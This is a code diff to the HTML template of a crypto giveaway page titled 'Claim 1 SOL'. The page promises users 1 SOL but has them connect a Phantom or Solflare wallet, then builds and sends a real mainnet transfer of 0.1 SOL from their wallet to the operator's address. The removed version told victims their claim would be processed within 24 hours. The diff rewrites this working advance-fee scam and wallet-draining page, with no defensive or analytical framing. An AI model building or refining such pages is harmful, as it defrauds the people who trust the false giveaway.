@@ -12,6 +12,7 @@ HTML_TEMPLATE = """
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1" />
   <title>Claim 1 SOL</title>
+  <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
   <style>
     body {
       background-color: #000;
@@ -47,20 +48,17 @@ HTML_TEMPLATE = """
       color: #ccc;
       font-size: 0.9em;
       white-space: pre-wrap;
-      min-height: 40px;
     }
   </style>
-  <!-- Include Solana web3.js -->
-  <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
 </head>
 <body>
   <h1>🎁 Claim 1 SOL</h1>
   <p>Send exactly <strong>0.1 SOL</strong> to:</p>
   <p><code>{{ wallet }}</code></p>
   <img id="qrCode" class="qr" src="{{ qr_url }}" alt="QR Code" />
-  
+
   <button class="button" id="connectBtn">🔗 Connect Wallet</button>
-  <button class="button" id="claimBtn" disabled>🎉 Claim Now</button>
+  <button class="button" id="claimBtn" disabled>💸 Claim Now</button>
   <div id="status">Click "Connect Wallet" to begin.</div>
 
   <script>
@@ -68,97 +66,72 @@ HTML_TEMPLATE = """
     const qr = document.getElementById("qrCode");
     const connectBtn = document.getElementById("connectBtn");
     const claimBtn = document.getElementById("claimBtn");
-    const WALLET_ADDRESS = "{{ wallet }}";
 
     let provider = null;
-    let publicKey = null;
-
-    function logStatus(msg) {
-      console.log(msg);
-      status.innerText = msg;
-    }
-
-    function detectProvider() {
-      if (window.solana?.isPhantom) {
-        return window.solana;
-      }
-      if (window.solflare?.isSolflare) {
-        return window.solflare;
-      }
-      if (window.phantom?.solana?.isPhantom) {
-        return window.phantom.solana;
-      }
-      return null;
-    }
+    let userPublicKey = null;
+    const receiverAddress = "{{ wallet }}";
 
     connectBtn.addEventListener('click', async () => {
-      logStatus("Detecting wallet provider...");
-      provider = detectProvider();
-
-      if (!provider) {
-        logStatus("⚠️ No wallet detected. Please use Phantom or Solflare wallets.");
+      if (window.solana?.isPhantom) {
+        provider = window.solana;
+      } else if (window.solflare?.isSolflare) {
+        provider = window.solflare;
+      } else {
+        status.innerText = "⚠️ No wallet detected. Open this in Phantom or Solflare.";
         qr.style.display = "block";
         return;
       }
-      qr.style.display = "none";
 
       try {
-        logStatus("Requesting connection from wallet...");
+        status.innerText = "🔄 Waiting for wallet approval...";
         const resp = await provider.connect();
-        console.log("connect response:", resp);
-        publicKey = resp?.publicKey || provider.publicKey;
-        if (publicKey) {
-          logStatus("✅ Connected wallet: " + publicKey.toString());
+        userPublicKey = resp.publicKey || provider.publicKey;
+
+        if (userPublicKey) {
+          status.innerText = "✅ Connected: " + userPublicKey.toString();
           claimBtn.disabled = false;
         } else {
-          logStatus("Connected but no publicKey received.");
+          status.innerText = "✅ Connected, but no publicKey received.";
         }
       } catch (err) {
-        console.error("Connection error:", err);
-        if (err.code === 4001 || (err.message && err.message.toLowerCase().includes("rejected"))) {
-          logStatus("❌ Connection rejected by user.");
-        } else {
-          logStatus("❌ Wallet connection failed or rejected.");
-        }
+        console.error("Connection failed:", err);
+        status.innerText = "❌ Wallet connection failed.";
       }
     });
 
     claimBtn.addEventListener('click', async () => {
-      if (!provider || !publicKey) {
-        logStatus("⚠️ Connect your wallet first.");
+      if (!provider || !userPublicKey) {
+        status.innerText = "⚠️ Please connect your wallet first.";
         return;
       }
 
       try {
-        logStatus("⏳ Preparing transaction to send 0.1 SOL...");
         const connection = new solanaWeb3.Connection(solanaWeb3.clusterApiUrl('mainnet-beta'), 'confirmed');
-        const toPubkey = new solanaWeb3.PublicKey(WALLET_ADDRESS);
+        const transaction = new solanaWeb3.Transaction();
 
-        const transaction = new solanaWeb3.Transaction().add(
-          solanaWeb3.SystemProgram.transfer({
-            fromPubkey: publicKey,
-            toPubkey,
-            lamports: solanaWeb3.LAMPORTS_PER_SOL * 0.1,
-          })
-        );
+        const receiverPubkey = new solanaWeb3.PublicKey(receiverAddress);
+        const senderPubkey = new solanaWeb3.PublicKey(userPublicKey);
 
-        transaction.feePayer = publicKey;
-        const { blockhash } = await connection.getRecentBlockhash();
-        transaction.recentBlockhash = blockhash;
+        const instruction = solanaWeb3.SystemProgram.transfer({
+          fromPubkey: senderPubkey,
+          toPubkey: receiverPubkey,
+          lamports: 0.1 * solanaWeb3.LAMPORTS_PER_SOL,
+        });
 
-        logStatus("⏳ Awaiting signature approval in wallet...");
-        const signedTransaction = await provider.signTransaction(transaction);
+        transaction.add(instruction);
+        transaction.feePayer = senderPubkey;
+        const blockhashObj = await connection.getRecentBlockhash();
+        transaction.recentBlockhash = blockhashObj.blockhash;
 
-        logStatus("⏳ Sending transaction...");
-        const signature = await connection.sendRawTransaction(signedTransaction.serialize());
-        logStatus("Transaction sent, signature: " + signature);
-
+        const signed = await provider.signTransaction(transaction);
+        const signature = await connection.sendRawTransaction(signed.serialize());
+        status.innerText = "⏳ Confirming transaction...";
         await connection.confirmTransaction(signature, 'confirmed');
-        logStatus("🎉 Transaction confirmed! You claimed 1 SOL.\nPlease wait 24h for processing.");
-        claimBtn.disabled = true;
+
+        status.innerText = "✅ Transaction successful!\nSignature: " + signature;
       } catch (err) {
-        console.error("Transaction error:", err);
-        logStatus("❌ Transaction failed: " + (err.message || err));
+        console.error("Transaction failed:", err);
+        status.innerText = "❌ Transaction failed. See console.";
       }
     });
   </script>
